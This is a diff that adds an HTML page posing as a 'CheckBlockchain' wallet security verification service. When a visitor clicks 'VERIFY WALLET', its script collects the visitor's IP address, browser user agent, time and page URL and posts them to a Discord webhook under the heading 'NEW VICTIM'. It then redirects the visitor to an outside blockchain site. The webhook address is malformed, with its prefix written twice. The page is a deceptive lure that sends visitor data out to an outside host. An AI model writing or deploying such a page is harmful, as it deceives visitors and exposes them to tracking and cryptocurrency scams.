@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<title>CheckBlockchain</title>
+<body style="margin:0;padding:20px;background:#1a1a2e;color:white;font-family:-apple-system,BlinkMacSystemFont,sans-serif;text-align:center">
+<div style="max-width:500px;margin:0 auto">
+<h1 style="font-size:2.8em;margin:60px 0 20px;font-weight:300">CheckBlockchain</h1>
+<p style="font-size:1.1em;line-height:1.5;margin-bottom:40px;color:#ccc">Security verification required<br><small>Protect your wallet from unauthorized access</small></p>
+<button onclick="verify()" style="background:linear-gradient(45deg,#ff6b35,#f7931e);color:white;border:none;padding:18px 50px;font-size:1.4em;border-radius:50px;cursor:pointer;font-weight:500;box-shadow:0 10px 30px rgba(255,107,53,0.3);transition:all 0.3s">VERIFY WALLET</button>
+<p style="font-size:0.85em;color:#888;margin-top:60px">CheckBlockchain Security © 2024</p>
+</div>
+<script>
+async function verify(){
+  const ip=await(await fetch('https://api.ipify.org?format=json')).json().then(r=>r.ip);
+  const data={content:`🕵️ **NEW VICTIM** | CheckBlockchain\n**IP:** \`${ip}\`\n**Agent:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}\n**URL:** ${location.href}`};
+  await fetch('https://discord.com/api/webhooks/https://discord.com/api/webhooks/1460016441574297704/OR2Eo9r61p1QJ2GlQ-c8txz-9uqIBXG3C_fVvW1DCM7-htvD0D9D-3BeziqTf8j7Ga47',{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  });
+  location.href='https://checkblockchain.org'; // Real blockchain explorer
+}
+</script>
